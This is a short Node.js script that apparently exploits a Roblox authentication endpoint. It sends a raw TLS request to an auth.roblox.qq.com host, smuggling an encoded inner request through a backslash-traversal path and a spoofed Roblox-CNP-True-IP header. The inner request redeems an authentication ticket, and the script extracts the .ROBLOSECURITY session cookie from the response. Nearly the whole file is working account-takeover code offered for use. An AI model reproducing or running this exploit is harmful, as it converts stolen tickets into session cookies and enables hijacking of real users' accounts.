const tls = require('tls');
const tlsOptions = {
    host: "auth.roblox.qq.com",
    port: 443
};

authtocookie("cookie", "ip")

async function authtocookie(auth_ticket, ip){

    const conn = tls.connect(443, tlsOptions);
    const purl = new URL("https://auth.roblox.com/v1/authentication-ticket/redeem");

    var path = purl.pathname;
    if(purl.hostname === "www.roblox.com"){
        path = "/login%5C.." + path.replace(/\//g, '%5C');
    }

    var payload = "";
    payload += " HTTP/1.1\r\n"
    payload += `Host: ${purl.hostname}\r\n`
    payload += `Content-Length: ${Buffer.byteLength(JSON.stringify({'authenticationTicket': `${auth_ticket}`}))}\r\n`
    payload += `Roblox-CNP-True-IP: ${ip}\r\n`
    payload += `RBXAuthenticationNegotiation: 1\r\n`
    payload += `Content-Type: application/json\r\n\r\n`
    payload += `{"authenticationTicket": "${auth_ticket}"}\r\n`
    payload += "\r\n"

    request = ""
    request += `POST ${path + encodeURI(payload)} HTTP/1.1\r\n`
    request += `Host: auth.roblox.qq.com\r\n`
    request += `Content-Length: 0\r\n`
    request += "\r\n"

    conn.write(request)
    conn.setEncoding('UTF-8')
    conn.on('data', (data) => {

        const cookie = data.split(' .ROBLOSECURITY=').pop().split(';')[0].replace(/\r?\n|\r/g, " ");
        if(cookie.includes("_|WARNING:")){

            try{
                conn.destroy();
                console.log(cookie)
            }catch (err){
                console.log(err)
            }
        }else{
            conn.destroy();
            console.log("Not Found")
        }
    })
}